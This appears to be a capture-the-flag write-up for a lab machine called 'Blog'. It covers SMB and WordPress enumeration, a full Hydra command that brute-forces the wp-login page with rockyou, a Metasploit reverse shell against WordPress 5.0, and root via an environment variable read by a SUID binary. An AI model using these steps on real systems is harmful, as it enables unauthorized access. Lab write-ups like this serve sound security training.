# Blog Write-up

## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {target_ip}
```

### Scan Results:

![image](https://github.com/user-attachments/assets/d799ac5f-9d06-4d92-92ae-9ad28dc490ed)

## SMB Enumeration

Taking a look into the SMB ports for some files may yield some information.

```bash
smbclient -L {target_ip}
```

![image](https://github.com/user-attachments/assets/b82b7277-6869-4be6-8481-f89680e62122)

No information is taken from any of the files but the tswift and check-this file are pretty funny.

The only thing of value is a possible username with Billy. Moving onto the webpage for some continued exploit searching.


## HTTP enumeration

Given a simple blog page some important information is given. The webpage is a using WordPress which can be enumerated by wpscan, a scanner specifically designed to enumerate wordpress.

```bash
wpscan --url blog.thm -e u
```

Cutting out the unimportant information, there is two users found and a specific version of WordPress (5.0).

Usernames:
1. kwheel
2. bjoel

![image](https://github.com/user-attachments/assets/f9ed6906-e698-48d6-a3fd-c8adcf43d15e)

## Directory Enumeration

With a basic gobuster scan, a login page is discovered, brute forcing with some credentials is an excellent option here if rate limiting isn't implemented.

```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u blog.thm -x .txt,.php -t 64
```

![image](https://github.com/user-attachments/assets/2c12f4d6-6b36-45a3-a3d2-c2dbcabce2c8)

### Password Cracking

Using Hydra to bruteforce kwheel's password.

```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -v -f
```

![image](https://github.com/user-attachments/assets/bb03a490-867a-421b-9194-4ec660e8a4fd)

Now that credentials have been obtained, access to the edit the page is gained.


### Word Press Exploitation

Since WordPress is using version 5.0, metasploit has a exploit ready to go for a reverse shell.

![image](https://github.com/user-attachments/assets/9b9948f9-f0d5-4f96-9143-db841e2dc691)

With the payload configured, running it gives a meterpreter shell, which I prefer to turn into a normal command shell.
### First Flag

Into the home directory of bjoel, user.txt is a trap! Fool me once or something but I will take you down.

![image](https://github.com/user-attachments/assets/cfd27844-8992-4326-af02-9489069bb409)

## Privilege Escalation

 suid permissions.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
One binary in particular is interesting, /usr/sbin/checker. Using ltrace to track what library calls are made, we see that admin env variable is checked. What if we set it to 1?

![image](https://github.com/user-attachments/assets/73008bbe-a62b-4ebf-87d3-76d304d982d7)

![image](https://github.com/user-attachments/assets/3f2cc210-2016-4650-8a07-2343e3b137e4)

And with that we've obtained root privileges!

### Actual First Flag and Root Flag

![image](https://github.com/user-attachments/assets/28e9dadc-7d77-4a52-9e30-8eb28de3ea52)

### Notes:
- Enumeration of WordPress, could've been better but it was my first time using wpscan which is a great tool and something I will be implementing into my repertoire.
